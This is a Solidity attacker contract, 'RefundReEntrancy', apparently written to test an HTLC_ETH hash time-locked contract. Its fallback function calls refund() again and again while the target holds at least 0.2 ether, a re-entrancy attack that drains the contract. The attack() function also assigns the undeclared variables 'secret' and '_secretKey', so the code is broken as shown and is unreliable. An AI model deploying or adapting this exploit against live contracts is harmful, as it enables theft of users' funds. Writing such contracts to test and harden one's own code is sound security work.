pragma solidity 0.8.10;

import "../htlc/HTLC_ETH.sol";


contract RefundReEntrancy {

    HTLC_ETH htlcEth;

    bytes32 id;
    

    constructor(address _htlcEthAddress) {

        htlcEth = HTLC_ETH(_htlcEthAddress);
    }

    //  contract recieving ether should have a fallback or receive function but payable
   

    fallback() external payable {

        // attack implementation

        if(address(htlcEth).balance >= 0.2 ether) {

            htlcEth.refund(id);

        }
          
    }

    

    function attack(bytes32 _swapID) external {
        id = _swapID;
        secret = _secretKey;

        htlcEth.refund(_swapID);

    }

    function balance() external view returns (uint256) {
        return address(this).balance;
    }
 
}